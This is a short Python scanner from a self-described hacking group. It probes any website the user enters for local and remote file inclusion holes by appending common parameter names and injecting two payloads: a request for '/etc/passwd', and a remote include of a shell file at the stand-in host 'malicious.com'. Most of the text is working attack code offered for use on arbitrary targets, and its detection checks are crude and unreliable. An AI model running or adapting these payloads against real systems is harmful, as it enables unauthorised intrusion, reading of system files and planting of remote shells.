import pyfiglet
from termcolor import colored
print(colored(pyfiglet.figlet_format("LFI & RFI Vulnerability Scanner", font="slant"), "cyan"))
print ()
import requests
from termcolor import colored
from tabulate import tabulate
print(colored("Don't forget to follow my Instagram account ahu_orphan", "yellow"))
print ()
print(colored("This tool is designed by orphan from Lulzsec Black team", "cyan"))
print ()
print(colored("Link to the team's channel on Telegram: https://t.me/Luzsec_Black", "magenta"))
print ()
print(colored("To communicate on Telegram: @orphan_cyber", "green"))
print ()
print ()
def check_lfi(url):
    lfi_payload = '/etc/passwd'
    try:
        response = requests.get(url + lfi_payload, timeout=5)
        if 'root:x:0:0:' in response.text:
            return True
    except requests.RequestException:
        pass
    return False

def check_rfi(url):
    rfi_payload = 'http://malicious.com/shell.txt'
    try:
        response = requests.get(url + rfi_payload, timeout=5)
        if 'remote shell' in response.text.lower():
            return True
    except requests.RequestException:
        pass
    return False

base_url = input("Enter the website URL (e.g., http://example.com/page.php): ")

parameters = [
    '?file=', '?page=', '?path=', '?dir=', '?document=', '?folder=',
    '?action=', '?module=', '?load=', '?content=', '?layout=', '?view=',
    '?include=', '?section=', '?item=', '?type=', '?category=', '?template=',
    '?component=', '?controller=', '?handler=', '?service=', '?page_id=',
    '?route=', '?resource=', '?class=', '?context=', '?name=', '?pageName=',
]

results = []

for param in parameters:
    url = base_url + param
    lfi_result = check_lfi(url)
    rfi_result = check_rfi(url)
    results.append({
        'URL': url,
        'LFI': colored('Vulnerable', 'red') if lfi_result else colored('Not Vulnerable', 'green'),
        'RFI': colored('Vulnerable', 'red') if rfi_result else colored('Not Vulnerable', 'green'),
    })

headers = ['URL', 'LFI', 'RFI']
table = [[res['URL'], res['LFI'], res['RFI']] for res in results]

print(tabulate(table, headers, tablefmt='grid'))

